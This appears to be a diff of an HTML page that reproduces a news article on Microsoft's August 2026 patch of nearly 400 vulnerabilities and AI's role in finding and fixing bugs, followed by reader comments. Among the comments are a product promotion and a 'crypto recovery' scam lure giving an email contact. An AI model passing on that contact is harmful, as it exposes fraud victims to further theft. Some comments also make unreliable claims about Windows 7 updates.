-It is remarkable how machine intelligence is fundamentally reshaping iteration speed across tech. The article points out how faster discovery cycles are changing vulnerability management, and we see a very similar shift happening in digital production. Just as developers rely on automation to analyze massive codebases, creative teams use multi-model platforms like Seedeo to rapidly generate and test video, audio, and visual assets. As production velocity increases across both cybersecurity and media workflows, the real challenge for teams becomes maintaining strong oversight and quality control alongside that accelerated output.</div>
+            <h2 class="article-title">Microsoft Plugs Nearly 400 Security Holes</h2>
+            <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/08/microsoft-plugs-nearly-400-security-holes/" target="_blank">Original Link</a></p>
+            <div class="content-text">Microsoft today released updates to remedy at least 398 security vulnerabilities in its Windows operating systems and supported software, including one weakness that is already being actively exploited and two others that were publicly detailed prior to today.
+August’s overstuffed bundle of patch joy from Microsoft did not eclipse its recording breaking release of [more than 570 security updates last month](https://krebsonsecurity.com/2026/07/microsoft-patches-a-record-570-security-flaws/), but it is double June’s then-record batch of [nearly 200 fixes](https://krebsonsecurity.com/2026/06/a-record-breaking-patch-tuesday-for-june-2026/#more-73788). Microsoft has attributed the recent patch deluge to vulnerability discoveries aided by artificial intelligence, and experts roundly agree that Windows users should get used to the idea of Patch Tuesdays (the second Tuesday of each month) covering hundreds of newly discovered security flaws.
+Fully 42 of the 398 flaws that Microsoft patched today earned Redmond’s most-dire “critical” rating, meaning they are severe enough that malware or malcontents could exploit them to gain remote control over a Windows computer with little to no help from the user.
+The sole known “zero day” bug fixed by Microsoft this month is [CVE-2026-68820](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-68820), a privilege escalation weakness in a core Windows component called afd.sys, which the security firm Automox describes as “the driver behind Windows socket connections on effectively every endpoint.”
+“This isn’t a front-door bug,” Automox’s Landon Miles [wrote](https://www.automox.com/blog/patch-fix-tuesday-august-2026) in a Patch Tuesday blog post. “It’s step two in a chain: an attacker phishes their way into a low-privilege foothold, then uses the driver flaw to take the box. The 7.0 score reflects the high attack complexity, because race conditions are fiddly. The exploit has to be thrown over and over until the timing lands. Someone is clearly landing it anyway.”
+[CVE-2026-62832](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-62832) is another privilege escalation flaw that Microsoft has labeled likely to be exploited; this flaw, in the Windows User Profile Service, may be related to the recent [“LegacyHive” public disclosure](https://www.theregister.com/security/2026/07/15/microsofts-serial-tormentor-drops-legacyhive-0-day/5271723) from the prolific bug hunter known as Nightmare Eclipse. The other publicly disclosed flaw is [CVE-2026-72971](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-72971), a low-impact local tampering vulnerability that Microsoft reckons is unlikely to be exploited.
+Other major software makers are likewise increasing their patch volumes and cadence thanks to AI, including Adobe which last month moved to twice-monthly security bulletins published on the 2nd and 4th Tuesday of each month. Cisco, Google, Mozilla and Oracle also are shipping updates far more frequently and abundantly.
+By all accounts, AI is quite good at finding security holes in software. But for now at least, patching the resulting bugpocalypse remains a heavily human-centric endeavor, and the jury is still out on whether AI technologies will turn out to be as good at fixing vulnerabilities as they are at finding and exploiting them. This is an important question when one considers that these same AI technologies also are suggesting fixes for the vulnerabilities they find.
+Researchers at 1Password recently [examined](https://1password.com/blog/why-ai-generated-patches-still-require-human-review) what happens when different large language models (LLMs) generate vulnerability patches for newly disclosed, complex vulnerabilities. They found the LLMs produced patches that failed to fix the flaw or added a new weakness in the process (or both) more than half the time.
+Ed Skoudis, president of the SANS Technology Institute, said his team has seen excellent results using AI to generate patches, provided there are humans in the loop to test the suggested fixes and push for iterative improvements.
+“AI is rapidly becoming astonishingly good at finding vulnerabilities, but this research shows that fixing them is a very different problem,” Skoudis wrote in a SANS newsletter today. “Don’t expect one-shot AI patching to work reliably. Instead, iterate, test, challenge, improve, and verify. AI can be an extraordinary patching partner, but today it still needs a skilled human at the keyboard.”
+Tyler Reguly at Fortra says while reports of Microsoft patching hundreds of vulnerabilities in one go have prompted some organizations to try to patch faster, it’s important to bear in mind that only one of the almost 400 bugs addressed today is known to be actively exploited. Reguly suggested security leaders check in with their teams to see how they’re handling the increasing workloads, which often involve testing fixes before deploying them in production environments.
+“If you’re a chief security officer talk to your teams about how they are shifting or modifying their workflows to better accommodate the patching shift that we’re seeing and support them across various organizational units by enabling the changes they want to see made,” Reguly said. “There’s no need to rush these updates, no matter what various vendors and organizations try to tell you. You need to make sure that you are rolling out safe updates that will not negatively impact your systems.”
+Speaking of the humans behind the keyboards, don’t neglect to backup your system and/or data before applying this month’s monster patch load. The day after each month’s Patch Tuesday is sometimes derisively referred to as Reboot Wednesday, but it generally doesn’t hurt to wait a few days to apply these huge update bundles because it sometimes takes a couple of days for the occasional misbehaving patch to get ironed out properly by Microsoft.
+For a clickable, per-patch breakdown by severity and urgency, check out [this roundup](https://isc.sans.edu/diary/Microsoft%20Patch%20Tuesday%20August%202026/33236) from the SANS Internet Storm Center.
+Time to rewrite the code using the help of AI to create a new base with less security holes and easier to maintain.
+Windows 12?
+This is why I still use Windows 7. I was never convinced that the Microsoft upgrades did anything other than refine their advertising for XBOX or whatever. The entire suite of Windows versions is riddled with security problems, despite the ridicule offered by IT colleagues. By the way I still receive the monthly Patch Tuesday security updates despite promises from Microsoft that older versions of Windows are not supported. They know as we know now, Microsoft Windows is a sinking ship.
+You get virus definition type ‘updates’ monthly, rarely an actual ‘security update’ on 7. That doesn’t help a lot.
+If you however run behind a firewall and don’t reach out to bad stuff, you’ll be fine until you aren’t.
+You deserve to be ridiculed for thinking Windows 7 is secure in 2026. You are *not* getting ‘patch Tuesday’ updates. This comment is wild and you seem like the type of person to use Windows 7 just to say you are still using Windows 7. How brave.
+Technically most people’s footprints are most greatly reduced by choice of browser; can’t get past that (or the third party app) and aren’t going to get too far achieving ring 0.
+So don’t be daft. It is not impossible to have an almost locked down Windows 7 install in 2026. Most people don’t but that is because most people just don’t know s#it about how to secure their system, or Windows 7 because their system has less than the 8gb of ram that MS builds into their developers’ mindsets as an acceptable amount of minimum ram to require to run either of the more current versions of Windows.
+But seriously. Most people would be fine with the most recent patches and enough knowledge of what is exploitable that is not patched by Microsoft to work around it or lock it down another way. Or run it virtualized (which is so nice because it removes the annoyances of having Windows as a host OS and linking being able to exploit that to anything without a virtual machine escape, in the first place (and for that usually you would have to be an actual target and dealing with someone with actual skills not just automated attacks and attempts at the most low-hanging fruit).
+Sorry, that should be, or they run Windows 7 because (they lack RAM)
+Funny how AI helps find the flaws and create exploits to attack them. But the AI is used to create patches and help keep software safe. Just seems like AI has just up’d the ante’ on everything good and bad. Jury still out and where this is all going. Me, I am not optimistic.
+My thought on how good AI will be at creating patches is to liken today to a few years ago when the attacker was very much more human: it is far easier to find & exploit vulnerabilities then it is to create secure software without security testing. AI hasn’t changed the latter at scale, yet. I imagine a time coming when more people shift their thinking, time, and money towards AI assisted code reviews.
+Does it count still when they are all extorted from submitters…security…Microsoft…..haha maybe against them…
+Using AI to find security issues isn’t a bad thing but I’m worried we’re heading towards too much dependence on it. AI has already shown the ability to hack websites without any human interaction. Can anyone say ‘Skynet’? (from the Terminator movies)
+“AI can be an extraordinary patching partner, but today it still needs a skilled human at the keyboard.” Hopefully just not a Connor Riley Moucka.
+Brian, your sarcasm has improved slightly. It is too late.
+Having been in security for decades upon decades now (which is to say, at least since Patch Tuesdays came around rather recently), I still cannot figure out why this is not tested the previous week by Microsoft then rolled out on Patch Wednesdays or Patch Thursdays not Tuesdays.
+The race condition is not that fiddly. If it were 2006 then it might have been a pain to exploit, but with modern systems with plenty of processing power and memory, certainly faster and doable. Good thing it is being patched!
+I have never looked into it. But I thought pretesting patches was a purpose of the optional preview downloads the month before Patch Tuesday. (I don’t think I have ever downloaded that.)
+That’s nice. It’s a shame there is nothing good to replace it. I suppose you think Linux is a good alternative to it for normal people. It isn’t (I say this is a techie, can we just not be so much?) The truth is it is still most people’s only option. Linux is a cauldron of thousands of peoples’ most bizarre old thoughts intermingling in hell.
+(and osx/Mac os is pretty bad too, derwin)
+It’s not that easy to get back a scammed funds because these scammers are very smart and they will cover their traces but if you manage to find a trustworthy and reliable Recovery company because many scammers are out there disguising as Recovery agents and will only take your money without recovering your funds, I was a victim of such myself after loosing all my funds to cryptocurrency scam. I sort for a help and I met few recovery agents, I was scammed by a particular one again Luckily for me I was referred to these legitimate company and they where able to recover my money back to me. You can as well contact them on RECOVERYDAREK AT gmail DOT com
+After doing these updates this evening, my keyboard stopped working. I usually have no problems with Microsoft updates. I queried ChatGPT. It told me to unplug the keyboard from the CPU, wait 10 seconds, and then plug it back in. That worked. I am not an IT person. An everyday computer user who is grateful for Krebsonsecurity.com.
+just finished my update and no problems. i’m on older desktop with Win10.
+Just found another issue after latest Windows update. My file history is no longer working. Last time it worked was just before my doing the Windows update. Did a lot of back and forth with ChatGPT and the end result is that it was due to the Windows update. Since I also back up to an external hard drive, I elected to wait and see if there is a fix from Microsoft. Anyone else having this issue?
+Nearly 400 security fixes in a single update really shows how challenging modern software security has become. The point about AI being better at finding vulnerabilities than reliably fixing them is especially interesting.</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
